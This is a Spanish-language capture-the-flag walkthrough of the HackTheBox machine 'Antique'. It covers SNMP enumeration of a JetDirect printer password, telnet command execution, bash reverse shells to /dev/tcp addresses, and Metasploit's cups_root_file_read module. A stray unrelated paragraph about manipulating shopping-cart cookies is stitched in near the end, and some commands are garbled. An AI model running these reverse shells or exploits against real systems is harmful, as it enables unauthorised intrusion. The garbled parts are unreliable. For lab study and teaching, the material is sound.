# Máquina "Antique" de HackTheBox

- Linux  
- Fácil  
- SNMP Enumeration 
- Network Printer Abuse 
- CUPS Administration Exploitation (ErrorLog) EXTRA -> (DirtyPipe) [CVE-2022-0847]

Util en:

- eJPT

        IP 10.10.11.107

- nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.107

PORT   STATE SERVICE

23/tcp open  telnet

- nmap -p 23 -sCV -oA scans/nmap-tcpscripts 10.10.11.107

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.80%I=7%D=5/2%Time=626F2AC3%P=x86_64-pc-linux-gnu%r(NULL,
SF:F,"\ nHP\ x20JetDirect\ n\ n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPass
...[snip]...
SF:rect\n\nPassword:\x20");
```

agregamos el nombre al etc hosts, por ahora solo vemos el puerto telnet. Al intentar conectarnos sin contraseña se reusa la coneccion al intentar adivinar la muestra en
texto claro. Al lanzar burpsuite tampoco encontramos nada asi que procedemos con escaneo udp

- sudo nmap -sU --top-ports 10 -sV 10.10.11.107

```
PORT     STATE  SERVICE      VERSION
53/udp   closed domain
67/udp   closed dhcps
123/udp  closed ntp
135/udp  closed msrpc
137/udp  closed netbios-ns
138/udp  closed netbios-dgm
161/udp  open   snmp         SNMPv1 server (public)
445/udp  closed microsoft-ds
631/udp  closed ipp
1434/udp closed ms-sql-m
```

vemos el puerto 161 udṕ snmp asi que lanzamos 

- snmpwalk -v 2c -c public 10.10.11.107

iso.3.6.1.2.1 = STRING: "HTB Printer"

leemos este artico que encontramos 
https://www.irongeek.com/i.php?page=security%2Fnetworkprinterhacking&source=post_page-----7349e7804b81--------------------------------

esta vez lanzamos

- snmpget -v 1 -c público 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0

y obtuvimos

50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 3 106 111 114 115 119 122 123 126 130 131 134 135

lo convertimos de hexadecimal a texto y obtenemos

- P@ssw0rd@123!!123 

nos conectamos nuevamente por telnet esta vez usando la password
una vez dentro hacemos ?

La mayor parte se trata de configurar la impresora, pero la última, execEs muy interesante para mis propósitos. intentaré correr id: 

- exec id

uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)

encontramos la flag en  /var/spool/lpd
procederemos a mandarnos una reverse shell usando bash

- exec bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'

Ahora dentro lanzamos

- netstat -tnlp

vemos otro puerto ademas de telnet 

- nc 127.0.0.1 631

- curl 127.0.0.1:631

vamos a renviar este puerto para poder acceder.

- socat tcp-listen:9090,fork tcp:127.0.0.1:631 &

ahora en nuestro localhost veremos el puerto y vemos.

![Texto alternativo](/secciones/posts/imagenes/antique/web1.webp)

La página predeterminada de Apache2 ejecutamos nmap: 

- nmap -sV -sC -p 9090 10.10.11.107

tenemos CUPS 1.6.1. Busqué exploits y encontré un módulo de metasploit llamado cups_root_file_read. 

Ahora, para este exploit, necesitamos un shell en metasploit. Entonces, abra metasploit usando msfconsole. Entonces:

use exploit/multi/handlerset payload linux/x64/shell/reverse_tcpset lhost run0set lport 1235

- bash -i >& /dev/tcp/10.10.14.110/1235 0>&1 

use multi/escalate/cups_root_file_read

set session 1

run

y funciona buscamos la flag y terminada.

Al colocar algunos artículos en el carrito del primer portal y proceder al pago , me doy cuenta de que los artículos en realidad están reportados en la factura emitida por 
el segundo portal. Por tanto, debe existir algún tipo de comunicación entre los portales. Al analizar el segundo portal, descubro cómo se pasa la información del carrito. 

es cookie codificada simple que puedo modificar. 

Algunos de los writeups en esta página, pueden tener contenido de otras páginas o tener muy pocas imágenes, esto 
debido a que en algunas de las máquinas que realice, no tome los apuntes o no tome capturas de pantalla, así que he decidido buscar varios writeups
y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí, también si encuentra faltas de ortografía 
o cualquier error, Puedes contactarme a mi correo.
